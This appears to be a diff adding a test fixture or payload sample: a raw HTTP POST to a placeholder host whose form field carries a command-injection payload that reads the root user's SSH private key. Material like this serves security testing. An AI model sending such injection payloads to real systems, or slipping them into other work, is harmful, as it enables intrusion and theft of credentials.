@@ -1,0 +1,7 @@
+POST /submit HTTP/1.1
+Host: demo.example.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 34
+Connection: close
+
+name=; /*x*/head /root/.ssh/id_rsa
